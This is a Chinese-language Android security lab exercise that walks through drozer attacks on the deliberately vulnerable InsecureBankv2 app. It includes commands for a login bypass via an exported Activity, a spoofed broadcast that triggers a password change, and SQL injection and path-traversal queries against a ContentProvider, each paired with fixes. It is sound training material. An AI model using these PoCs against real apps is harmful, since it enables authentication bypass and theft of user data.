# 練習 A — drozer 打靶找元件漏洞

> **目標**：把 Ch 3–6 的元件與 IPC 攻擊技巧，在一個真實靶 App 上從頭到尾串一遍：用 drozer 系統化枚舉攻擊面 → 定位 exported 元件與 Provider 的洞 → 對每個洞構造能觸發的 PoC（adb/drozer 指令或小攻擊 App）→ 寫成可重現的紀錄。這不是讀，是打。做完你會有一套「拿到陌生 App，drozer 該按哪些鍵」的肌肉記憶。

> **環境**：AVD（Android 13 / API 33，可 root），drozer（含 agent APK）、`adb`、`jadx`、`apktool`。靶用 **InsecureBankv2**（元件洞豐富，有 exported Activity/Receiver/Provider）或 **DIVA**（Provider SQLi/traversal 關卡清楚）。本練習的 drozer/adb 執行輸出一律標「**未實測，理論預期行為**」——本 repo 建構沙箱無 Android/drozer，你要在自己 AVD 上實跑；能離線用 Python 驗的邏輯（SQLi payload、path 正規化）標「**實際輸出**」。**只打你有權測試的靶**（開源刻意埋洞的 App），別拿這套打沒授權的目標。

## 規格：你要交付什麼

一份「元件漏洞打靶紀錄」，對選定的靶 App，涵蓋：

1. **攻擊面清單**：drozer 枚舉出的所有 exported Activity / Service / Receiver / Provider，每個標「暴露但可能無害」或「可疑值得打」。
2. **至少 3 個實際打穿的洞**，各含：漏洞類型（對應 Ch 3–6 哪一類）、漏洞點（Manifest/程式碼證據）、觸發 PoC（可複製的指令或攻擊碼）、影響、修復建議。三個洞要**跨類**（例如：1 個繞登入 Activity + 1 個偽造廣播 Receiver + 1 個 Provider SQLi 或 traversal），不要三個都是同一類。
3. **誠實標注**：哪些是你在 AVD 實跑看到的、哪些是理論推斷。

## 期望輸出長什麼樣

每個洞一段，格式固定（後面參考解答會給完整範例）：

```
[洞 #2] exported Receiver 偽造廣播 → 偽造登入狀態
類型：Ch 3 — 缺 permission 保護的 exported Receiver
漏洞點：Manifest 中 <receiver ... android:exported="true"> 且無 android:permission；
        onReceive 盲信 extra 的 userId 就 markLoggedIn。
PoC：adb shell am broadcast -a com.victim.LOGIN_SUCCESS -n com.victim/.AuthReceiver --es userId admin
觸發結果（AVD 實跑）：logcat 出現 "markLoggedIn(admin)"，App 狀態變已登入。
影響：任何 App 無需權限即可偽造登入，繞過認證。
修復：改用 signature permission 或 LocalBroadcast；onReceive 驗來源。
```

## 卡點預告（先看，省得卡死）

- **drozer console 連不上**：多半是 agent 的 embedded server 沒開、或 `adb forward tcp:31415 tcp:31415` 沒做、或 agent 版本與 console 不合。先 `adb shell am start` 開 agent、確認 forward、再 `drozer console connect`。
- **`app.activity.info` 列出的 exported 元件跟你讀 Manifest 推的不一致**：幾乎都是你把「有 filter、沒寫 exported、targetSdk<31 → 預設 exported」這條規則忘了（Ch 3 決策表）。以 drozer 為準，回頭補課。
- **啟動了 exported Activity 卻沒繞過登入**：它內部可能有 `isLoggedIn()` 檢查（Ch 3 範例一的失敗案例）。這是「exported ≠ 可利用」，用 jadx 讀它擋你的那行，誠實記為「暴露但有二次認證」。
- **Provider 掃描器報了注入卻撈不到資料**：可能是誤報，或 URI path 不對。用 `app.provider.finduris` 先確認真正可存取的 URI，再手動 `app.provider.query` 驗。
- **targetSdk≥31 的靶**：有 filter 的元件一定顯式寫了 exported，`am start` 隱式呼叫的行為和老靶不同，注意用 explicit component 啟動。

## 分步驟（照做，別跳）

### Step 1 — 裝靶、連 drozer、建立基準

```bash
# 裝靶（以 InsecureBankv2 為例）
adb install InsecureBankv2.apk
adb shell pm list packages | grep -i bank   # 拿到 package name，例如 com.android.insecurebankv2

# 開 drozer agent 的 server + forward + 連線
adb shell am start -n com.withsecure.dz/.activities.MainActivity   # 或舊版 com.mwr.dz
adb forward tcp:31415 tcp:31415
drozer console connect
```

先跑一次總覽，建立「這個 App 有多大攻擊面」的基準（**未實測，理論預期行為**）：

```
dz> run app.package.attacksurface com.android.insecurebankv2
```

### Step 2 — 枚舉四類元件，逐一分類

```
dz> run app.activity.info  -a com.android.insecurebankv2
dz> run app.service.info   -a com.android.insecurebankv2
dz> run app.broadcast.info -a com.android.insecurebankv2
dz> run app.provider.info  -a com.android.insecurebankv2
```

同時 `apktool d` 靶 APK 讀 Manifest、`jadx` 開起來備查。把每個 exported 元件列一行，先標「暴露」，等 Step 3–5 打過再升級成「可利用」或降級成「暴露但無害」。

### Step 3 — 打 Activity（繞登入）

挑一個「本該登入後才到」的 Activity（例如 `PostLogin`/`Dashboard`/`DoTransfer`），直接啟動：

```
dz> run app.activity.start --component com.android.insecurebankv2 com.android.insecurebankv2.PostLogin
# 或 adb shell am start -n com.android.insecurebankv2/.PostLogin
```

亮起來且顯示登入後內容 → Ch 3 範例一的洞。被彈回登入 → 用 jadx 讀 `onCreate`，記錄擋你的檢查。

### Step 4 — 打 Receiver / Service

Receiver 偽造廣播（InsecureBankv2 有個 `MyBroadCastReceiver` 之類接收轉帳/簡訊資訊的洞）：

```
dz> run app.broadcast.send --action <action> --component <pkg> <receiver> --extra string <k> <v>
# 或 adb shell am broadcast -a <action> -n <pkg>/<receiver> --es <k> <v>
```

Service 濫用（若有 exported Service）：

```
dz> run app.service.start --component <pkg> <service> --extra string <k> <v>
```

### Step 5 — 打 Provider（SQLi / traversal）

```
dz> run app.provider.finduris -a com.android.insecurebankv2
dz> run scanner.provider.injection -a com.android.insecurebankv2
dz> run scanner.provider.traversal -a com.android.insecurebankv2
```

命中後**手動驗**（掃描器會誤報，Ch 6 踩雷 4）：

```
dz> run app.provider.query content://<authority>/<path> --projection "* FROM sqlite_master--"
dz> run app.provider.read  content://<authority>/../../databases/<db>
```

### Step 6 — 每個打穿的洞寫成紀錄

照「期望輸出」的格式，每洞一段。跨類至少 3 個。標清楚哪些是 AVD 實跑、哪些理論推斷。

## 完整參考解答

先自己做完 Step 1–6 再看。這裡以 InsecureBankv2 的典型洞為例（指令與行為以該靶常見版本為準，**你要在自己 AVD 上實跑驗證**）。

<details>
<summary>參考解答：枚舉 + 3 個跨類 PoC（點開）</summary>

### 攻擊面枚舉（**未實測，理論預期行為**）

```
dz> run app.package.attacksurface com.android.insecurebankv2
Attack Surface:
  6 activities exported
  1 broadcast receivers exported
  0 services exported
  1 content providers exported
```

`app.activity.info` 會列出 `LoginActivity`、`PostLogin`、`DoTransfer`、`ViewStatement`、`ChangePassword`、`FilePrefActivity` 等 exported Activity。對照 Manifest：多數沒寫 `android:permission`，是裸露的攻擊面。

### 洞 #1 — 直接啟動 PostLogin 繞過登入（Ch 3 Activity）

```
類型：Ch 3 — exported Activity 直接啟動繞過認證
漏洞點：Manifest 中 <activity android:name=".PostLogin"> 對外可啟動；
        PostLogin.onCreate 未強制檢查有效 session 就顯示登入後畫面。
PoC：
  dz> run app.activity.start --component com.android.insecurebankv2 \
        com.android.insecurebankv2.PostLogin
  # 或 adb shell am start -n com.android.insecurebankv2/.PostLogin
觸發結果（AVD 實跑，你填實際觀察）：PostLogin 畫面直接顯示，未經 LoginActivity。
影響：繞過登入，直達轉帳/檢視功能入口。
修復：PostLogin.onCreate 開頭驗證 session，無效則導回 Login 並 finish()。
```

> 若你的 InsecureBankv2 版本在 PostLogin 有 session 檢查而被彈回，記為「暴露但有二次認證」，改拿 `DoTransfer`/`ViewStatement` 試——這正是「exported ≠ 可利用」的實戰判斷。

### 洞 #2 — 偽造廣播（Ch 3 Receiver）

```
類型：Ch 3 — 缺 permission 保護的 exported Receiver（偽造廣播）
漏洞點：<receiver android:name=".MyBroadCastReceiver" android:exported="true"> 無 permission；
        onReceive 盲信 extra（phonenumber/newpass 等）觸發敏感動作（如發送含新密碼的簡訊）。
PoC：
  dz> run app.broadcast.send --action theBroadcast \
        --component com.android.insecurebankv2 com.android.insecurebankv2.MyBroadCastReceiver \
        --extra string phonenumber 5556 --extra string newpass hacked123
  # 或 adb shell am broadcast -n com.android.insecurebankv2/.MyBroadCastReceiver \
  #      --es phonenumber 5556 --es newpass hacked123
觸發結果（AVD 實跑）：logcat 顯示 Receiver 處理了偽造 extra（依版本可能觸發簡訊/改密流程）。
影響：任何 App 無需權限即可注入資料 / 觸發敏感邏輯。
修復：signature permission 保護 receiver；onReceive 驗來源、不盲信 extra。
```

### 洞 #3 — Provider SQLi 或 path traversal（Ch 6）

```
類型：Ch 6 — 未過濾的 ContentProvider（SQL injection）
漏洞點：exported provider（authority 例 com.android.insecurebankv2.TrackUserContentProvider）
        query 將 selection/URI 直接拼進 SQL。
枚舉：
  dz> run app.provider.finduris -a com.android.insecurebankv2
  dz> run scanner.provider.injection -a com.android.insecurebankv2
手動驗證（撈 schema 再 dump）：
  dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers \
        --projection "* FROM sqlite_master--"
  dz> run app.provider.query content://com.android.insecurebankv2.TrackUserContentProvider/trackerusers \
        --selection "1=1"
觸發結果（AVD 實跑）：列出資料表結構與使用者資料（含帳號）。
影響：任意 App 可 dump 使用者資料庫。
修復：參數化查詢（selectionArgs），不信任呼叫者的 selection/projection；provider 設 exported=false 或加 signature permission。
```

**離線佐證（實際輸出）**：SQLi 的注入效果與 path traversal 的正規化，我用 Python 離線驗過其邏輯，可放進紀錄當「原理佐證」：

```python
# SQLi selection 短路成永真 → dump 全表
import sqlite3
c = sqlite3.connect(":memory:"); cur = c.cursor()
cur.execute("CREATE TABLE t(id,name)"); cur.executemany("INSERT INTO t VALUES(?,?)",[(1,"a"),(2,"b")]); c.commit()
print(cur.execute("SELECT name FROM t WHERE id=1 OR 1=1").fetchall())   # -> [('a',), ('b',)]

# path traversal：../ 跳出 base
import posixpath
base = "/data/data/com.android.insecurebankv2/files/shared/"
print(posixpath.normpath(base + "../../databases/mydb.db"))  # -> /data/data/com.android.insecurebankv2/databases/mydb.db
```

</details>

## 測試表：怎麼算做到了

| 檢查項 | 通過標準 |
|---|---|
| drozer 連線 | `drozer console connect` 進到 `dz>` prompt，`app.package.list` 能列出靶 |
| 攻擊面枚舉完整 | 四類元件都跑了 `*.info`，每個 exported 元件都分類過（暴露/可利用/無害） |
| Manifest 對照 | drozer 列的 exported 清單與你 `apktool d` 手推的一致（不一致已釐清原因） |
| Activity 洞 | 至少嘗試 1 個直接啟動；成功繞登入，或釐清為何被擋（有二次認證） |
| Receiver/Service 洞 | 至少 1 個偽造廣播或 Service 濫用，logcat 有觸發證據 |
| Provider 洞 | 掃描器命中後**手動** query/read 撈出真實資料（非只看掃描器報告） |
| 跨類 | 交付的 ≥3 個洞至少覆蓋 2 種不同 Ch（不全是 Activity） |
| 誠實標注 | 每個 PoC 標清「AVD 實跑觀察」vs「理論推斷」 |
| 可重現 | 每個 PoC 是可複製的指令/攻擊碼，別人照做能重現 |

## 延伸挑戰

1. **Intent redirection（Ch 4）**：靶裡若有「收 Intent 再轉發」的 exported 元件（jadx 搜 `getParcelableExtra`），構造巢狀 Intent 借道打一個 not-exported 元件，寫成第 4 個洞。體會「exported=false 也能被打」。
2. **寫一個真正的攻擊 App**：把其中一個洞（尤其 Service 濫用或 redirection）從 adb/drozer 指令改寫成一個獨立的 20 行攻擊 APK，`adb install` 後點一下就觸發。這比 drozer 更接近真實攻擊者的形態。
3. **PendingIntent（Ch 5）**：若靶有遞出 PendingIntent 的路徑，檢查它 mutable 與否、base 留白與否，嘗試填充劫持。多數簡單靶沒這洞，找不到就記「已檢查、無此洞」——**排除也是評估結果**。
4. **自動化雛形**：把 Step 1–5 的 drozer 指令串成一個 `.rc` script（`drozer console connect -f hunt.rc`），對任意 package 一鍵枚舉。這是 Ch 15 自動化的預演。

## 自我檢核

- [ ] 不看筆記，能說出拿到陌生 App 後 drozer 的枚舉順序（attacksurface → 四類 info → provider scanner）
- [ ] 打穿了至少 3 個跨類的洞，每個都有可複製的 PoC 與觸發證據
- [ ] 能對每個 exported 元件判斷「暴露 vs 可利用」，並解釋差別（有沒有二次認證/權限）
- [ ] Provider 洞是手動 query/read 撈出真實資料驗證的，不是只信掃描器
- [ ] 每個 PoC 都誠實標了「AVD 實跑」或「理論推斷」，別人能照著重現
- [ ] 能說出至少一個「檢查了但沒有的洞」——知道排除也是評估的一部分

## 延伸閱讀

- **[drozer 官方 — Command Reference & Content Provider / Activity 模組](https://github.com/WithSecureLabs/drozer)**
  - **讀哪裡**：`app.*.info`、`app.activity.start`、`app.broadcast.send`、`app.service.start`、`scanner.provider.*` 完整參數，以及 console `.rc` script 用法（延伸挑戰 4）
  - **和本練習的關聯**：本練習每個 Step 的指令都出自這裡
- **[InsecureBankv2 — 靶場說明與 walkthrough](https://github.com/dineshshetty/Android-InsecureBankv2)**
  - **讀哪裡**：README 的漏洞清單；對照你枚舉出的元件，確認有沒有漏打
  - **注意**：先自己打，卡住再看 walkthrough，別直接抄答案——手感是練出來的
- **[OWASP MASTG — Android IPC / Content Provider 測試流程](https://mas.owasp.org/MASTG/tests/android/)**
  - **讀哪裡**：元件與 Provider 的 test case，把你的打靶紀錄對齊到標準測試項與嚴重度分級
  - **和本練習的關聯**：交付紀錄的格式與措辭以此為準，這是通往 final 完整評估報告的橋
- **[HackTricks — Android Pentesting（drozer 段）](https://book.hacktricks.wiki/en/mobile-pentesting/android-app-pentesting/index.html)**
  - **讀哪裡**：drozer 枚舉與各元件攻擊的一站式指令
  - **前提知識**：做過本練習，這裡幫你把零散指令收攏成 cheat sheet

打完這一輪，你已經能對一個 App 的**元件與 IPC 面**做系統化評估了。下一章換戰場：從「別的 App 呼叫你的元件」轉到「網頁/外部連結呼叫你的 App」——deeplink 與 App Link 的劫持，以及 task hijacking 這種利用 Activity 堆疊做釣魚的攻擊。

→ [Ch 7 Deeplink / App Link 劫持與 task hijacking](./07-deeplink-task-hijacking.md)
